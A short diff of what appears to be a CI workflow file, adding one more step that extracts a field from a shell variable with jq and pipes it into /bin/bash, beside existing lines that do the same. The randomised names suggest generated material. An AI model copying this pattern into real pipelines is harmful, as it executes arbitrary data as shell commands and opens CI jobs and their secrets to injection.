@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$ffln87" | jq -r .pjptf54 | /bin/bash
           printf '%s' "$kypv191" | jq -r .f4 | /bin/bash
           printf '%s' "$y93296" | jq -r .dkhy0792 | /bin/bash
+          echo $v7429 | jq -r .paxej956 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
